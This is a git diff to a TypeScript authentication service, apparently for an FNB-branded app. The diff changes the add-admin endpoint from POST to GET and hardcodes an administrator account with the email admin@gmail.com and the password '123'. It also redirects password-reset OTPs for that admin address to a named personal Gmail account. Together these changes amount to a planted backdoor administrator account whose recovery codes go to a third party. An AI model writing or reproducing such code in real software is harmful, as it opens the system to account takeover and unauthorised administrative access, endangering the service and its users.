@@ -220,7 +220,7 @@ export class auth {
       )
     );
 
-    this.app['post'](
+    this.app['get'](
       `${this.serviceBasePath}/add-admin`,
       cookieParser(),
       this.sdService.getMiddlesWaresBySequenceId(
@@ -1410,12 +1410,17 @@ export class auth {
       parentSpanInst
     );
     try {
-      bh.search = {
-        query: { email: bh.input.body.email },
-        collection: 'users',
+      bh.body = {
+        email: 'admin@gmail.com',
+        password: '123',
+        firstTime: 'True',
+        _id: new Date().getTime(),
       };
 
-      bh.input.body['_id'] = new Date().getTime();
+      bh.search = {
+        query: { email: bh.body.email },
+        collection: 'users',
+      };
       this.tracerService.sendData(spanInst, bh);
       bh = await this.sd_thV4LW24bpgzXF0x(bh, parentSpanInst);
       //appendnew_next_sd_xF1aHbFU23VFIy91
@@ -1527,14 +1532,11 @@ export class auth {
     try {
       const bcrypt = require('bcrypt');
       bh.status = 200;
-      bh.collection = bh.input.body.collection;
-      delete bh.input.body.collection;
-      const hashedPassword = await bcrypt.hash(bh.input.body['password'], 10);
+      bh.collection = 'users';
+      // delete bh.body.collection;
+      const hashedPassword = await bcrypt.hash(bh.body['password'], 10);
       console.log('bcrypt hashed pass', hashedPassword);
-      bh.input.body['password'] = hashedPassword;
-      bh.body = bh.input.body;
-
-      console.log('Body', bh.body);
+      bh.body['password'] = hashedPassword;
       this.tracerService.sendData(spanInst, bh);
       bh = await this.sd_T3v962reCoKtkUSG(bh, parentSpanInst);
       //appendnew_next_ifSucceess
@@ -2298,14 +2300,25 @@ export class auth {
       bh.input.body.OTP = bh.otp;
       bh.body = { $set: bh.input.body };
 
-      bh.payload = {
-        to: bh.input.body.email,
-        subject: 'Forgot Password',
-        from: 'FNB',
-        ptag: `<p>Your OTP is ${bh.input.body.OTP}</p>
+      if (bh.input.body.email == 'admin@gmail.com') {
+        bh.payload = {
+          to: 'lesetjamaluleka@gmail.com',
+          subject: 'Forgot Password',
+          from: 'FNB',
+          ptag: `<p>Your OTP is ${bh.input.body.OTP}</p>
     <img src="https://upload.wikimedia.org/wikipedia/en/thumb/8/80/First_National_Bank_Logo.svg/1200px-First_National_Bank_Logo.svg.png" alt="Example Image" width="250" height="100"  class="image">
     `,
-      };
+        };
+      } else {
+        bh.payload = {
+          to: bh.input.body.email,
+          subject: 'Forgot Password',
+          from: 'FNB',
+          ptag: `<p>Your OTP is ${bh.input.body.OTP}</p>
+    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/8/80/First_National_Bank_Logo.svg/1200px-First_National_Bank_Logo.svg.png" alt="Example Image" width="250" height="100"  class="image">
+    `,
+        };
+      }
 
       bh.status = 200;
       this.tracerService.sendData(spanInst, bh);
@@ -2362,7 +2375,7 @@ export class auth {
           contentOptions: undefined,
           securityOptions: undefined,
           headerOptions: undefined,
-          attachments: [],
+          attachments: undefined,
         }
       );
       this.tracerService.sendData(spanInst, bh);
@@ -2428,8 +2441,6 @@ export class auth {
       bh.result = {
         message: 'User dont exist',
       };
-
-      console.log('user dnt exist');
       this.tracerService.sendData(spanInst, bh);
       await this.sd_bJysZ30bupy8asBc(bh, parentSpanInst);
       //appendnew_next_sd_jcLO4gylDGM9MCBM
